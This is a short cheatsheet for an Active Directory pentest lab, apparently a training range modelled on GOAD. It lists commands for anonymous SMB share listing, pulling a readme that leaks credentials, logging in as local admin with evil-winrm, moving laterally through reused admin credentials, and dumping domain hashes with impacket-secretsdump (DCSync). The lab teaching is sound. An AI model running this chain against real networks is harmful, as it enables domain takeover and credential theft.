# Cheatsheet — Kill Chain (mini-GOAD)

## Targets

- **dc01 + dc02** — two domain controllers (primary + replica)
- **ws01 + ws02** — workstations with local-admin reuse

## Useful commands

```bash
smbclient -N -L //<ws01>/                            # anonymous listing
smbclient -N //<ws01>/ops -c 'get readme.txt -'      # the entry leak
evil-winrm -i <ws01> -u wadmin -p '<from readme>'    # local admin
# ws01 readme names ws02's admin → lateral hop
impacket-secretsdump corp.pentrain.local/<da-user>:'<pw>'@<dc02>
```

## Concepts

- Local admin creds reused across workstations → hop laterally
- A DA service account's creds open DCSync on both DCs — one domain
- Anonymous shares on a workstation are rare — enumerate every host, not
  just the DCs
